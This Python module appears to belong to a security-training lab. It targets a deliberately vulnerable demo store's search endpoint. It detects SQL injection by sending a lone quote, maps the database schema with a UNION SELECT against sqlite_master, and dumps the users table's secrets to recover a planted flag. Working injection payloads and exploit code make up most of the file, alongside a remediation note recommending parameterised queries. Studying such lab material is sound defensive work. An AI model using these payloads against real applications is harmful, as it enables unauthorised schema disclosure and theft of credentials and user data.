"""Database schema enumeration via UNION-based SQL injection.

WHAT THE VULNERABILITY IS
-------------------------
The demo store's ``/search?q=`` endpoint concatenates the user-supplied query
straight into a SQL statement::

    SELECT id, username, email FROM users WHERE username LIKE '%<q>%'

Because ``<q>`` is interpolated, not bound as a parameter, an attacker can break
out of the string literal and append arbitrary SQL. This is the same flaw the
``sqli`` module exploits, but here we use it for *database enumeration*: rather
than going straight for a known secret, we behave like an attacker who lands on
an unfamiliar app and must first map the schema -- which tables exist, what
columns they hold -- before deciding what to steal. On SQLite the schema lives
in the ``sqlite_master`` table, which every connection can read.

HOW WE DISCOVER IT
------------------
Inject a lone single quote (``q="'"``). The unbalanced quote makes the SQL
unparseable, and the handler leaks the database error verbatim
("``SQL error: unrecognized token``"). A reflected parser error from a single
quote is the classic fingerprint of error-based SQL injection.

HOW WE EXPLOIT IT
-----------------
The original query selects three columns (``id, username, email``), so a UNION
must also select three columns. We use a two-stage enumeration:

1. *List tables and columns.* UNION against ``sqlite_master``::

       ' UNION SELECT '<sentinel>', name, sql FROM sqlite_master WHERE type='table' --

   ``sqlite_master.name`` gives the table name and ``sqlite_master.sql`` gives
   its ``CREATE TABLE`` statement, from which we parse the column list. We also
   prefix the query string with an impossible ``LIKE`` match so the *original*
   rows drop out and only our UNION-injected rows -- each tagged with a unique
   ``<sentinel>`` -- come back. That makes parsing unambiguous: we keep only the
   rows we planted.

2. *Dump the prize.* Having confirmed a ``users`` table with a ``secret``
   column, UNION-select it::

       ' UNION SELECT id, secret, role FROM users --

   ``admin``'s ``secret`` is the planted flag, recovered end-to-end.

HOW TO FIX IT
-------------
See :data:`REMEDIATION`. In short: never build SQL by string concatenation. Use
parameterised queries / prepared statements so input can never change the query
structure, and do not leak raw database errors to clients.
"""
from __future__ import annotations

import re
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Severity
from .http_client import WebClient
from .targetapp import constants as C

ENDPOINT = "/search?q="

#: Unique tag we inject into a literal SELECT column. Because the base query
#: filters on ``username LIKE '%...%'`` we can force it to match nothing and
#: keep only our UNION rows -- every one of which carries this sentinel.
_SENTINEL = "WLABX_ENUM"

#: A ``LIKE`` pattern that no seeded username matches, so the original query
#: contributes no rows and only the injected UNION rows are returned.
_NO_MATCH = "zqx_nomatch_zqx"

#: The payloads this module sends. ``{sentinel}`` / ``{nomatch}`` are filled at
#: runtime; listed pre-filled here so the catalogue is self-documenting.
PAYLOADS: List[str] = [
    # 1. error-based detection: a lone quote breaks the SQL and leaks the error
    "'",
    # 2. enumerate tables + their CREATE SQL (column definitions) via sqlite_master
    (
        f"{_NO_MATCH}' UNION SELECT '{_SENTINEL}', name, sql "
        "FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' -- "
    ),
    # 3. dump the users table to recover admin's secret (the flag)
    "' UNION SELECT id, secret, role FROM users -- ",
]

REMEDIATION: str = (
    "Never build SQL by concatenating untrusted input. Use parameterised "
    "queries (prepared statements / bound parameters) -- e.g. "
    "cursor.execute(\"... WHERE username LIKE ?\", ('%' + q + '%',)) -- so "
    "user input is always treated as data and can never alter the query's "
    "structure. Apply least-privilege to the database account (no access to "
    "metadata tables or columns it does not need), validate/escape input at the "
    "boundary, and never return raw database error messages to the client "
    "(which enable error-based injection and schema disclosure); log them "
    "server-side and show a generic error instead. An allow-list ORM layer or a "
    "well-reviewed query builder helps enforce this consistently."
)

# Each rendered search result row is "<div class='user'>A | B | C</div>".
_ROW_RE = re.compile(r"<div class='user'>(.*?)</div>", re.DOTALL)


def _search(client: WebClient, q: str):
    """Send one injected value to the /search SQLi sink."""
    return client.get("/search", params={"q": q})


def _rows(body: str) -> List[Tuple[str, str, str]]:
    """Parse the three pipe-separated columns out of each result <div>."""
    out: List[Tuple[str, str, str]] = []
    for cell in _ROW_RE.findall(body):
        parts = [p.strip() for p in cell.split(" | ", 2)]
        while len(parts) < 3:
            parts.append("")
        out.append((parts[0], parts[1], parts[2]))
    return out


def detect(client: WebClient) -> Optional[str]:
    """Error-based detection: a lone quote should leak a SQL parser error.

    Returns the evidence string if injectable, else ``None``.
    """
    resp = _search(client, "'")
    if "SQL error" in resp.text:
        marker = resp.text.strip()
        if len(marker) > 160:
            marker = marker[:160] + "..."
        return marker
    return None


def _parse_columns(create_sql: str) -> List[str]:
    """Extract column names from a SQLite ``CREATE TABLE ... (...)`` statement."""
    start = create_sql.find("(")
    end = create_sql.rfind(")")
    if start == -1 or end == -1 or end <= start:
        return []
    inner = create_sql[start + 1 : end]
    columns: List[str] = []
    depth = 0
    field = ""
    # Split on top-level commas (none nest here, but be safe).
    for ch in inner:
        if ch == "(":
            depth += 1
        elif ch == ")":
            depth -= 1
        if ch == "," and depth == 0:
            columns.append(field)
            field = ""
        else:
            field += ch
    if field.strip():
        columns.append(field)
    names: List[str] = []
    for raw in columns:
        token = raw.strip().split()
        if not token:
            continue
        name = token[0].strip('"`[]')
        upper = name.upper()
        # Skip table-level constraints (PRIMARY KEY (...), FOREIGN KEY, ...).
        if upper in {"PRIMARY", "FOREIGN", "UNIQUE", "CHECK", "CONSTRAINT"}:
            continue
        names.append(name)
    return names


def enumerate_schema(client: WebClient) -> Dict[str, List[str]]:
    """Map user tables -> their column lists via a single sqlite_master UNION.

    Forces the base query to match nothing and tags every injected row with
    ``_SENTINEL`` so only our UNION rows are parsed.
    """
    payload = (
        f"{_NO_MATCH}' UNION SELECT '{_SENTINEL}', name, sql "
        "FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' -- "
    )
    body = _search(client, payload).text
    schema: Dict[str, List[str]] = {}
    for col0, table, create_sql in _rows(body):
        if col0 != _SENTINEL:
            continue  # not one of our injected rows -> ignore base-query noise
        if table:
            schema[table] = _parse_columns(create_sql)
    return schema


def dump_users(client: WebClient) -> Dict[str, str]:
    """Dump (username/role -> secret) from the users table via UNION.

    Returns a mapping keyed by role so the caller can pick out ``admin``'s
    secret without guessing usernames.
    """
    payload = "' UNION SELECT id, secret, role FROM users -- "
    body = _search(client, payload).text
    secrets: Dict[str, str] = {}
    for _id, secret, role in _rows(body):
        # The base LIKE '%...%' also returns the real id|username|email rows;
        # those carry email-shaped col2 and have role in {} of our targets, so
        # we keep only rows whose third column looks like a role keyword.
        if role in {"admin", "user"} and secret:
            secrets[role] = secret
    return secrets


def assess(client: WebClient) -> Finding:
    """Detect + exploit database enumeration over the /search SQLi surface.

    Pipeline: confirm injection (error-based) -> enumerate the schema from
    ``sqlite_master`` -> dump the users table to recover the admin secret flag.
    """
    evidence = detect(client)
    discovered = evidence is not None

    if not discovered:
        return Finding(
            vuln="Database Enumeration (SQLi)",
            endpoint=ENDPOINT,
            severity=Severity.HIGH.value,
            discovered=False,
            evidence="no SQL error leaked from a lone-quote probe",
            remediation=REMEDIATION,
        )

    schema = enumerate_schema(client)
    secrets = dump_users(client)
    # admin.secret is the prize; fall back to any recovered secret matching the
    # planted flag so the exploit_result always carries it when reachable.
    flag = C.FLAGS["db_enum"]
    secret = secrets.get("admin", "")
    if secret != flag:
        for value in secrets.values():
            if value == flag:
                secret = value
                break

    # Put ``secret`` first so the flag survives Finding.__str__'s 200-char
    # truncation of the JSON-dumped result (the schema map can be large). Dict
    # equality/membership are order-independent, so the contract shape is kept.
    exploit_result = {"secret": secret, "tables": schema}

    return Finding(
        vuln="Database Enumeration (SQLi)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=True,
        evidence=(
            f"lone-quote probe leaked a database error ({evidence!r}); "
            f"sqlite_master UNION enumerated {len(schema)} tables: "
            f"{', '.join(sorted(schema)) or 'none'}"
        ),
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=PAYLOADS[1],
        extra={
            "schema": schema,
            "detection": "error-based (leaked SQL parser error from a lone quote)",
            "enumeration": "UNION SELECT against sqlite_master (type='table')",
            "users_dumped": secrets,
            "tables_found": sorted(schema),
        },
    )
